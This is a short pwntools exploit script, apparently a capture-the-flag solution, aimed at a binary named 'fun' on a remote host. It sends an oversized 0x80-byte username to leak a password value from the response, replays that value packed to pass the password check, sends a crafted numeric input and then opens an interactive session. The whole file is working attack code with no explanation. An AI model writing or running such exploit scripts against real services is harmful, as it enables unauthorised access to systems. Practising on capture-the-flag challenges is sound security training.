from pwn import *
context.log_level = 'debug'

debug = 0
localfile = "./fun"
ip = ""
port = ''

if debug == 1:
	p = process(localfile)
else:
	p = remote("113.201.14.253",30000)

#gdb.attach(p,"b *$rebase(0xD10)")
#raw_input()

payload = 0x80 * 'a'
p.recvuntil('UserName\n')
p.sendline(payload)
p.recvuntil(payload)
pwd = int(p.recv(10))
print "pwd:",hex(pwd)
p.recvuntil('PassWord\n')
p.sendline(p64(pwd))
		
#p.recvuntil('N =')
p.sendline('1')
p.sendline('4632251120704552960')
	
p.interactive()